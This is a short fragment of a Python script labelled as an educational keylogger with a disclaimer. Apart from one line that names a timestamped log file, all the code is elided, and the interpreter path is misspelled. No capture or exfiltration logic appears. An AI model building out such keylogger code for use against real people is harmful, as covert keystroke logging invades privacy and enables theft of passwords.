#!/usr/binn/python 
'''
This is an example of a keylogger created for educational purposes only
I do not take any responsibility for illegal use of the keylogger
'''
...
def main():
    ...
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.keylogger'
